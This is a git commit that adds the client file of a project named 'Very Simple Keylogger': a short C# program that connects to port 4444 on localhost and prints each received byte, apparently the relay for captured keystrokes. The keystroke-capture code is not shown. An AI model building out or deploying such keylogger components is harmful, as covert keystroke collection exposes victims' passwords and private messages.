81763b0e2fdd6edb31aba6a2c2ac421e96990135
Can Koç <koccan9@outlook.com>
2022-09-22 19:30:55 +0300

    2

---
+++ Very Simple Keylogger/GetAsyncKeyState Client/GetAsyncKeyState Client/Program.cs
@@ -0,0 +1,15 @@
+﻿using System.IO;
+using System.Net.Sockets;
+
+static class Program
+{
+    static void Main(string[] args)
+    {
+        TcpClient tc = new TcpClient("localhost", 4444);
+        
+        while (true)
+        {
+            Console.WriteLine((char)tc.GetStream().ReadByte());
+        }
+    }
+}
